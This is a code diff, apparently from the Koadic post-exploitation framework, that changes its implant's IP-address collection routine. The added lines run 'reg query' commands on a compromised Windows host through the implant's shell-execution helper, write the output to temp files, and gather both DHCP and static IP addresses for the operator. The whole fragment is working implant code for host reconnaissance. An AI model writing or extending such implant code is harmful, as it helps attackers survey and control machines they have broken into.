@@ -244,7 +244,9 @@ Koadic.user.IPAddrs = function()
         {
             var interface = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces\\"+interfaceid;
             var res = Koadic.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+Koadic.uuid()+".txt");
-            retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___"
+            retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___";
+            res = Koadic.shell.exec("reg query "+interface+" /v IPAddress", "%TEMP%\\"+Koadic.uuid()+".txt");
+            retstring += res.split("REG_MULTI_SZ")[1].split("\r\n")[0]+"___";
         }
         catch(e)
         {continue;}
